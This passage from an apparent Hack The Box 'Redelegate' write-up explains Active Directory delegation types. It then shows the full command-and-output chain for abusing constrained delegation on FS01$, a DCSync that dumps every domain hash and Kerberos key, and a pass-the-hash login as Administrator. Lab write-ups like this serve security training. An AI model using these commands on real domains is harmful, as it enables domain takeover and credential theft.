- **MachineAccountQuota = 0**, so no new machine accounts can be created
- DNS modifications fail due to insufficient rights
- Unconstrained delegation requires a valid SPN and hostname, not an IP address

Because of these restrictions, **unconstrained delegation is not viable**.
****
##### **2. Constrained Delegation**

Constrained delegation allows a machine to impersonate users _only to specific services_ on designated hosts. It is more controlled than unconstrained delegation but still extremely powerful if misconfigured.

To configure constrained delegation, an account with **SeEnableDelegationPrivilege** must set:

- the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag in `userAccountControl`
- the `msDS-AllowToDelegateTo` attribute, which defines the service SPNs the machine can act against

In this environment, Helen has full control (`GenericAll`) over the `FS01$` computer object. Combining this with her delegation privilege means she can configure `FS01$` to impersonate users to a chosen service on another machine.

##### **3. Resource-Based Constrained Delegation (RBCD)**

RBCD reverses the trust direction. Instead of the attacker configuring _who the machine can delegate to_, the target machine decides _who is allowed to delegate to it_. This is controlled via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

Key points:

- RBCD does not require **SeEnableDelegationPrivilege**
- It does require write access to the target computer object
- RBCD is not the path here because `FS01$` needs constrained delegation configured _outbound_, not inbound

---
## Abusing Constrained Delegation on FS01$

With Helen holding **SeEnableDelegationPrivilege** and **GenericAll** over the FS01$ computer object, the next step is to take control of `FS01$`, configure constrained delegation on it by setting the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag and the `msDS-AllowedToDelegateTo` attribute, and then use that configuration to obtain Kerberos tickets that let me impersonate higher-privileged accounts.

##### **Request a TGT for Helen.Frost**

I start by generating a TGT for Helen so that all AD modifications are performed with her delegated privileges:

```bash
──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ impacket-getTGT redelegate.vl/helen.frost:'Password123.'               
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in helen.frost.ccache
```

Then I load it into the environment:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ export KRB5CCNAME=helen.frost.ccache 
```

##### **Take Ownership of the FS01$ Machine Account**

I reset the machine account password using `bloodyAD` and verify that the new creds work:
```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ bloodyAD -d redelegate.vl -k --host "dc.redelegate.vl" set password "FS01$" 'Password123.'
[+] Password changed successfully!

┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ netexec smb redelegate.vl -u FS01$ -p 'Password123.' 
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.50   445    DC               [+] redelegate.vl\FS01$:Password123. 
```

At this point, I fully control the FS01$ object.

##### **Perfoming Delegation**

I enable the **TrustedToAuthForDelegation** flag and set the **msDS-AllowedToDelegateTo** attribute so `FS01$` is allowed to request delegated tickets to the domain controller’s `CIFS` service:

```powershell
*Evil-WinRM* PS C:\Users>Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
*Evil-WinRM* PS C:\Users> Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="cifs/dc.redelegate.vl"}
*Evil-WinRM* PS C:\Users> 
```

With delegation configured, `FS01$` is now able to perform **S4U2Self** and **S4U2Proxy** flows on behalf of other users. The next move is to impersonate a privileged account, in this case, the **DC$** machine account is enough since it holds replication rights by default.

I request a delegated service ticket using `FS01$`'s credentials:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ impacket-getST redelegate.vl/fs01\$:'Password123.' -spn cifs/dc.redelegate.vl -impersonate dc         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Now that I have a Kerberos service ticket impersonating `DC$`, I can use it to perform a DCSync and dump the domain’s password hashes:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ KRB5CCNAME=dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache secretsdump.py -k -no-pass dc.redelegate.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:fa7665befe243a5079d1c602f5524ce0:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:fa7665befe243a5079d1c602f5524ce0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
Christine.Flanders:des-cbc-md5:8980267623df2637
Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
Marie.Curie:des-cbc-md5:256889c8bf678910
Helen.Frost:aes256-cts-hmac-sha1-96:7897386679492b1e93b9369ec92ae0291dfa20163278321fd2c180df0dce7db4
Helen.Frost:aes128-cts-hmac-sha1-96:41c1a07447ef9ce2a12445083d18a24e
Helen.Frost:des-cbc-md5:d90ee575d5c17cb5
Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
Michael.Pontiac:des-cbc-md5:833dc82fab76c229
Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
Mallory.Roberts:des-cbc-md5:cb25a726ae198686
James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
sql_svc:des-cbc-md5:970d6115d3f4a43b
DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
DC$:des-cbc-md5:3db913751c434f61
FS01$:aes256-cts-hmac-sha1-96:0249bc576599be331fc03633c40e2aa1633f0e5fc35ef63bda7d9c72373df934
FS01$:aes128-cts-hmac-sha1-96:37393f8d0ff5bfe0f60cef88fe03de6e
FS01$:des-cbc-md5:ecc7f215cdc4c845
[*] Cleaning up... 
```

## Shell as Admin

With the Administrator hash in hand, the last step is simply to authenticate and retrieve the final flag. I use `evil-winrm` with the NTLM hash to log in directly as the Domain Administrator:

```bash
┌──(sicario㉿kali)-[~/HacktheBox/redelegate]
└─$ evil-winrm -i redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/28/2025  12:10 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
